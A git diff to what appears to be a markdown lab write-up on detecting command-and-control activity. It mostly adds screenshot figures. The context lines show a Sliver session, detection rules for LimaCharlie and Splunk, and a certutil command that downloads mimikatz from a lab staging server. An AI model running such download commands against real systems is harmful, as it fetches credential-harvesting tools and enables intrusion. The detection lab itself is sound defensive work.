@@ -1,4 +1,5 @@
-# Phase 5: Command and Control 
+# Phase 5: Command and Control
+
 ---
 
 ## Overview
@@ -58,8 +59,22 @@ C:\Windows\system32> whoami /priv
 ```
 
 📌 Screenshot Note:  
-Insert screenshot of Sliver session info confirming SYSTEM context  
-Insert screenshot of `whoami /priv` output showing elevated privileges
+Insert Sliver session info screenshot  
+Insert `whoami /priv` screenshot
+
+<p align="center">
+  <img src="images/info 2.png">
+</p>
+<p align="center">
+  <em>Figure 5.1: Sliver session info confirming SYSTEM context</em>
+</p>
+
+<p align="center">
+  <img src="images/info 1.png">
+</p>
+<p align="center">
+  <em>Figure 5.2: whoami /priv output showing elevated privileges</em>
+</p>
 
 ---
 
@@ -82,8 +97,12 @@ rules:
    path: event/NETWORK_ACTIVITY/DESTINATION_IP
 ```
 
-📌 Screenshot Note:  
-Insert LimaCharlie network telemetry showing Common.exe ESTABLISHED connection
+<p align="center">
+  <img src="images/limainfo.png">
+</p>
+<p align="center">
+  <em>Figure 5.3: LimaCharlie network telemetry showing Common.exe established outbound connection</em>
+</p>
 
 ---
 
@@ -109,8 +128,8 @@ index=windows EventCode=3 Image="*\\Common.exe"
 ```
 
 📌 Screenshot Note:  
-Insert Splunk timechart showing consistent beaconing pattern  
-Insert Splunk stats table of outbound connections
+Insert Splunk timechart showing beacon pattern  
+Insert Splunk stats table
 
 ---
 
@@ -144,9 +163,12 @@ The attacker uses `certutil.exe` to download a credential harvesting tool from a
 certutil -urlcache -split -f http://192.168.1.101:8001/mimikatz/x64/mimikatz.exe C:\Users\Public\mimikatz.exe
 ```
 
-📌 Screenshot Note:  
-Insert staging server console showing HTTP GET request  
-Insert Sliver shell confirming successful download
+<p align="center">
+  <img src="images/sliver1.png">
+</p>
+<p align="center">
+  <em>Figure 5.4: Staging server console showing HTTP GET request and successful download</em>
+</p>
 
 ---
 
@@ -170,10 +192,26 @@ rules:
    value: "urlcache"
 ```
 
-📌 Screenshot Note:  
-Insert LimaCharlie alert console screenshot  
-Insert timeline showing process tree:  
-services.exe → Common.exe → certutil.exe
+<p align="center">
+  <img src="images/certucil.png">
+</p>
+<p align="center">
+  <em>Figure 5.5: LimaCharlie alert console identifying certutil misuse</em>
+</p>
+
+<p align="center">
+  <img src="images/processtree.png">
+</p>
+<p align="center">
+  <em>Figure 5.6: Timeline showing process tree (services.exe → Common.exe → certutil.exe)</em>
+</p>
+
+<p align="center">
+  <img src="images/windows.png">
+</p>
+<p align="center">
+  <em>Figure 5.7: Evidence of downloaded suspicious file on the host system</em>
+</p>
 
 ---
 
@@ -198,8 +236,21 @@ CommandLine="*urlcache*" AND CommandLine="*http*"
 ```
 
 📌 Screenshot Note:  
-Insert Splunk results showing certutil execution  
-Insert parent-child relationship linking to Common.exe
+Insert Splunk certutil detection results
+
+<p align="center">
+  <img src="images/link2.png">
+</p>
+<p align="center">
+  <em>Figure 5.8: Splunk results showing certutil execution</em>
+</p>
+
+<p align="center">
+  <img src="images/link.png">
+</p>
+<p align="center">
+  <em>Figure 5.9: Parent-child relationship linking certutil to Common.exe</em>
+</p>
 
 ---
 
